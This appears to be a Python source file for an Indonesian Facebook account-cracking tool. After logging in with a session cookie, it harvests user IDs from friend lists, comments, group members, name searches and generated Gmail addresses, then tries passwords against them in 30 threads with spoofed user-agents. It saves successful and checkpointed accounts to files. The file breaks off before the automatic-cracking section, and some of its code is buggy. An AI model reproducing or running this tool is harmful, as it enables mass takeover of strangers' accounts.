###----------[ IMPORT MODULE LAIN ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()

###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich import print as cetak
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ GLOBAL NAMA ]---------- ###
sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = []
ugen = []
hakix = []
ngentott = []

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FFFF"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"

###----------[ GET DATA DARI DEVICE ]---------- ###
#android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
#try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
#except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
#versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE AGENT ]---------- ###
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua_v = f"Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]"
	ua_s = f"Mozilla/5.0 (Linux; Android 10; Nokia 6.1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/344.0.0.8.106;]"
	ua_o = f"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"
	ua_r = f"Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692"
	ua_d = f"Mozilla/5.0 (Symbian/3; Series60/3.2 Nokia XpressMusic/06.103; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"
	ua_x = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
	ua = str(rc([ua_d,ua_s]))
	if ua_s in ugent:pass
	else:ugent.append(ua_s)
	
for xcTeam in range(1000):
	rr = random.randint
	rc = random.choice
	ngentot1 = f"Mozilla/5.0 (Linux; Android 12; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
	if ngentot1 in ngentott:pass
	else:ngentott.append(ngentot1)
	ngentot2 = f"Dalvik/2.1.0 (Android 13; SM-S918B Build/TP1A.220624.014.{str(rr(111111,199999))}.001) [FBAN/MessengerLite;FBAV/{str(rr(120,150))}.0.0.2.{str(rr(110,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(200000000,299999999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/ SM-S918B;FBSV/13;FBCA"
	if ngentot2 in ngentott:pass
	else:ngentott.append(ngentot2)
	ngentot3 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
	if ngentot3 in ngentott:pass
	else:ngentott.append(ngentot3)
	ngentot4 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
	if ngentot4 in ngentott:pass
	else:ngentott.append(ngentot4)

def kontol():
 rr = random.randint
 rc = random.choice
 konton = f"Mozilla/5.0 (Linux; Android {str(rr(3,9))}.{str(rr(0,1))}.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
 return random.choice([konton])

###----------[ KETERANGAN WAKTU ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def CetakBanner(ulfahsadiyah,asu):
    Console(width=100).print(Panel(ulfahsadiyah,style='red'),justify='center')
def whoami(kaya,kontol):
    Console(width=100).print(Panel(kaya,style='red'),justify='center')
###-----------------[]-----------------###
###----------[ LOGO AUTHOR DAN VERSI]---------- ###
class Logo:
	
	###----------[ BERSIHKAN LAYAR ]---------- ###
	def bersihkan_layar(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass

	###----------[ LOGO ]---------- ###
	def logonya(self):
		self.bersihkan_layar()
		prints(Panel(f"""{color_text} ________   ___      ___  _______    _______  
("      "\ |"  \    /"  ||   _  "\  /"     "|  {M2}██████████████████████[/]
 \___/   :) \   \  //   |(. |_)  :)(: ______)  {M2}██████████████████████[/]
   /  ___/  /\\  \/.    ||:     \/  \/    |     {P2}██████████████████████[/]
  //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████[/]
 (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
  \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder
{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
{B2}│ {P2}Author : Fall Xavier {B2}│{B2}│ {P2}Version : 2.2 {B2}│{B2}│ {P2}Recode By : DensXyz {B2}       │
{B2}╰──────────────────────╯{B2}╰───────────────╯{B2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
	
	
	
###----------[ BAGIAN LOGIN ]---------- ###
class Login:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ MENU LOGIN ]---------- ###
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{H2}\t                            Menu Login",width=87,style=f"{color_panel}"))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook ( {H2}Recomended{P2} )\n[{color_text}02{P2}]. login menggunakan No dan Password ( {M2}No Recomended{P2} )""",width=87,style=f"{color_panel}"))
		login = console.input(f" {H2}• {P2}pilih menu : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=87,style=f"{color_panel}"))
			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
			#open("data/cookie","w").write(cookie)
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
			
	###----------[ LOGIN COOKIE ]---------- ###
	def login_cookie(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=87,style=f"{color_panel}"))
			sys.exit()
		
	###----------[ UBAH BAHASA ]---------- ###
	def ubah_bahasa(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
		
###----------[ BAGIAN MENU ]---------- ###
class Menu:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ CEK INFO LOGIN ]---------- ###
	def cek_login(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=87,style=f"{color_panel}"))
			exit()
			
	###----------[ MENU UTAMA ]---------- ###
	def menu(self):
		Logo().logonya()
		
		###----------[ GET COOKIE DAN DATA ]---------- ###
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		
		###----------[ PANEL BIASA ]---------- ###
		pornhub = []
		yonkou = []
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {H2}• {K2}• {H2}Negara {M2}• {H2}• {K2}•",subtitle=f"{M2}• {H2}• {K2}• {H2}Version : VERSI 2.2{M2} • {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {H2}{nama}\n {K2}Status Pengguna {P2}: {H2}PRIBADI\n {K2}Ip Address      {P2}: {H2}{self.ip}\n {K2}Tanggal         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-JandaMuda {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Recode By {P2}: {H2}DensXyz\n {K2}Github  {P2} : {H2}github.com\n{K2} Facebook {P2}: {H2}Dens\n{K2} Whatsapp {P2}: {H2}+62*************",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-JandaPirang {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{H2}Sunshine ID, Rachel ID, Fall Xavier, Suwan Dundo",width=87,title=f"{H2}Thanks To",style=f"{color_panel}"))
		prints(Panel(f"{H2}\t                           Daftar Menu",width=87,style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{color_text}01{P2}]. crack {K2}dari {H2}id publik\n{P2}[{color_text}02{P2}]. crack {K2}dari {H2}pengikut\n{P2}[{color_text}03{P2}]. crack {K2}dari {H2}komentar\n{P2}[{color_text}04{P2}]. crack {K2}dari {H2}random email",width=43,padding=(0,2),style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{color_text}05{P2}]. crack {K2}dari {H2}pencarian nama\n{P2}[{color_text}06{P2}]. crack {K2}dari {H2}member grup\n{P2}[{color_text}07{P2}]. crack {K2}dari {H2}file sendiri\n{P2}[{color_text}08{P2}]. cek {K2}opsi {H2}checkpoint",width=43,padding=(0,2),style=f"{color_panel}"))
		self.tol.print(Columns(pornhub))
		prints(Panel(f"""{P2}   ketik {M2}logout{P2} untuk hapus cookie dan ketik {H2}lain{P2} untuk ke menu lain""",width=87,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		
		###------------[ logout ]------------###
		if menu in["logout"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python haki-fb.py""",width=87,style=f"{color_panel}")))
		###----------[ ID PUBLIK ]---------- ###
		elif menu in["1","01"]:
			prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id atau username : ")
			if user in["Me","me"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atursandi()
			
		###----------[ KOMENTAR ]---------- ###
		elif menu in["3","03"]:
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
			Crack().atursandi()
			
		###----------[ KOMENTAR ]---------- ###
		elif menu in["4","04"]:
			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			limit = console.input(f" {H2}• {P2}masukan limit : ")
			Dump(cookie).Dump_Email(user,limit)
			Crack().atursandi()
			
		###----------[ PENCARIAN NAMA ]---------- ###
		elif menu in["5","05"]:
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			common = open("Haki/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
			except:pass
			Crack().atursandi()
		
		###----------[ MEMBER GRUP ]---------- ###
		elif menu in["6","06"]:
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atursandi()
			
		###----------[ FILE MASSAL ]---------- ###
		elif menu in["7","07"]:
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()

		###----------[ PINDAH KE MENU BOT ]---------- ###
		elif menu in["BOT","Bot","bot"]:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
		###----------[ OPSI CHECKPOINT ]-------------###
		elif menu in["8","08"]:
			file_cp()
			
		###----------[ PINDAH KE MENU LAIN ]---------- ###
		elif menu in["LAIN","Lain","lain"]:
			Lain(cookie).menu()
			
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
			
###----------[ BAGIAN DUMP ]---------- ###
class Dump:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
			
	###----------[ GET USER SENDIRI ]---------- ###
	def GetUser(self):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass

	###----------[ DUMP ID PUBLIK ]---------- ###
	def Dump_Publik(self,url):
		try:
			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
		except:pass
			
	###----------[ DUMP KOMENTAR ]---------- ###
	def Dump_Komentar(self,url):
		try:
			data = parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
		except:pass
		
	###----------[ DUMP PENCARIAN NAMA ]---------- ###
	def Dump_Pencarian(self,url):
		try:
			data = parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all("td"):
				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian(x.get("href"))
		except:pass
		
	###----------[ DUMP MEMBER GRUP ]---------- ###
	def Dump_MemberGrup(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
		except:pass
		
	###----------[ DUMP FILE ]---------- ###
	def Dump_File(self,lok):
		try:
			file = open(lok,"r").read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
		
	###----------[ DUMP FILE ]---------- ###
	def Dump_Email(self,nama,limit):
		try:
			for z in range(int(limit)):
				email = nama+str(z)+"@gmail.com<=>"+nama
				if email in tampung:pass
				else:tampung.append(email)
		except:pass

###----------[ BAGIAN CRACK ]---------- ###
class Crack:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		
	###----------[ ATUR SANDI DAN METODE ]---------- ###
	def atursandi(self):
		prints(Panel(f"""{P2}    berhasil mengumpulkan {len(tampung)} id""",width=87,padding=(0,21),style=f"{color_panel}"))
		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
		###----------[ SANDI MANUAL ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
				exit()
			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.manual(pwx)
		
		###----------[ SANDI OTOMATIS ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
				exit()
		else:
			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis()
		
	###----------[ CRACK MANUAL ]---------- ###
	def manual(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					pwx = pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
						
	###----------[ CRACK OTOMATIS ]---------- ###
